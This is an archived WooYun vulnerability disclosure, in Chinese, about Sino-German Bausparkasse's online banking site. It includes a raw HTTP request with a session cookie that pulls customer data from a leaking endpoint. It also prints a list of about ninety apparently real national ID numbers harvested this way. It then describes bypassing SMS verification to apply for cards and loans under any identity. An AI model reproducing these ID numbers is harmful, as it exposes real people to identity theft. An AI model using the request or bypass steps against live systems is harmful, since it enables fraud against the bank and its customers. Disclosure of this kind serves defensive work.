{"id": 86993, "wybug_id": "wooyun-2016-0193328", "wybug_title": "P2P金融安全之建行旗下中德储蓄银行用户个人信息侧漏\\绕过验证机制任意身份申请住卡\\任意身份申请贷款", "wybug_corp": "中德储蓄银行", "wybug_author": "千斤拨四两", "wybug_date": "2016-04-07 10:26", "wybug_open_date": "2016-05-22 10:30", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "安全意识不足", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-05-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 中德住房储蓄银行有限责任公司（以下简称“中德银行”）于2004年2月开业，是中国建设银行控股的一家专业经营住房信贷业务的商业银行，总行设于天津。中德银行现注册资本20亿元人民币，由中国建设银行与德国施威比豪尔住房储蓄银行共同出资，双方持股比例分别为75.1%和24.9%。在专业经营源自欧洲的住房储蓄业务4年后，2008年底，中德银行进一步推出个人住房贷款、房地产开发贷款等商业银行业务，并逐步确立了“专业于住房金融，专注于住房储蓄”的市场定位。 详细说明：  无意间侧漏了大量用户的身份证信息，姓名，手机号等敏感信息：\nPOST /perbank/queryWhiteList.do HTTP/1.1Host: ebank.sgb.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: https://ebank.sgb.cn/perbank/mainBank.html?dHJhbkNvZGU9JkVNUF9TSUQ9QU9EQ0RGRFJFTUFXRlJGT0FBQUNJSUpTRUNCVklMR1RER0hRR0tBSiZjdXN0b21lck1lc3NhZ2U9JmNzdFR5cGU9MDAmcGhvbmVGbGFnPTM=Content-Length: 81Cookie: snbp_tag=false; JSESSIONID=Xmx5XGScphPvpFQVzmTsST9s208T2h98dhjKDQZMJqtTMgyxhBy1!1162102123Connection: keep-alivechannel=1105&EMP_SID=AODCDFDREMAWFRFOAAACIIJSECBVILGTDGHQGKAJ&responseFormat=JSON\n\n\n\n\n\n\n复制response信息，脚本正则匹配身份证，身份证号可作为登录用户名贴出部分：恶意的用户会严重影响用户的使用，如果密码输入限制次数5次将被锁定：\n120103198603303819   120105198006200312   120102198705300313   120102198707205619   120104198804213816   210502198904042111   120104198706224319   120104198610051249   230811198405053824   120101196711020021   120104197601122127   130431198812260820   130984199009122140   120224197905200922   120224197108134846   120224198812085325   120225197912234529   372928198405277620   620522198511260742   120112198712292924   632525198208190529   120110197208283327   371427198403180046   130928197709140024   231182198605016612   120105198402230708   120101198301241031   421381198903081367   120103198207301141   120103198909257026   120111198801244020   120105198903080613   120102198702195327   120106198409063523   130230198701091211   120101198907241511   130103198308300975   130404198212053917   120106198102263512   120101198710082051   120105198203282716   120103197303190328   232700197111204204   120224197209121729   220524198607061228   120106198512016020   120101198603163032   120224198401117329   120224197607051527   120104198312194372   120225197806224319   120101198304291018   120106198101077523   120105198008111225   120103198009065424   120102198109100016   120102198010072027   120102198812230015   120105197502230348   120101198906143514   341124198507122413   12010119830923352X   120105198608254836   220122198602050226   120106198011137529   120102198711164442   120106198408181034   120225198511120816   320724198902070666   650102198803141217   120101198908281515   420984197804199024  120101198901215013   120106198907290024   61032319850822682X   120225199005145222   120105198408111216   120101198411194045   120103198804083226   410526198503076431   120104198011155118   120104197812073812   130621198707162717   120110199012221246   120222198809137013   120105197302283947   37292619760813004X   232601197910310848\n比如密码找回功能同样侧漏用户姓名，customerId：输入侧漏出的身份证如下：\n\n\n\n修改customerNameCN值为0，可将认证方式修改为手机方式，不支持手机方式同样可强制以手机方式认证，如下图修改后的结果：\n\n可看出之前是USB-KEY。----------------------------------------------------------------------------------------------------------------------------------------------------------------------------绕过手机验证码申请住卡，点击申请会先进行一次身份认证，绕过有两种方法，一种是截断数据包修改接受验证码的手机号，另一种是修改response信息：\n\n\n\n修改为如下图信息即可：\n\n之后会跳转到申请人的信息，如下：\n\n点击下一步，修改如下：\n{\"ec\":\"0\",\"em\":\"\",\"flowno\":\"100019500\",\"sequenceNo\":\"7515257\",\"windowId\":\"null\"}\n之后response会返回工作人员的敏感信息：\n\n申请成功：\n\n货代的验证机制更是简单，同样的方法修改接收验证码的手机号或response：\n\n\n\n证明：\n\n   漏洞证明：  同上   修复方案：  完善验证机制。。。   版权声明：转载请注明来源 千斤拨四两@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：20 (WooYun评价)  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 20, "Ranks": null}